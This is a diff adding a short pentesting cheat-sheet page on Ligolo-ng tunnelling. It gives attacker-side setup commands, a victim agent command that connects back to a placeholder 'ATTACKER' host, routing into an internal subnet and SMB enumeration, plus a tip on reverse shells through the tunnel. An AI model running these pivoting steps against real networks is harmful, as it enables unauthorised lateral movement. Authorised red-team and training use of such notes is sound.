@@ -1,0 +1,27 @@
+---
+title: "Ligolo-ng"
+---
+
+Cleaner than SOCKS — creates a real `tun` interface so you route to internal subnets natively, no proxychains.
+
+```bash
+# Attacker (once)
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+# Victim (agent) connects back
+./agent -connect ATTACKER:11601 -ignore-cert
+```
+
+```bash
+# In the ligolo proxy console
+session            # pick the agent
+# Then on the attacker box: add a route to the internal subnet via ligolo
+sudo ip route add 172.16.5.0/24 dev ligolo
+# now reach hosts directly
+nxc smb 172.16.5.19
+```
+
+<Tip>
+Use `listener_add` in the console for reverse shells/file transfers back through the tunnel from deep hosts.
+</Tip>
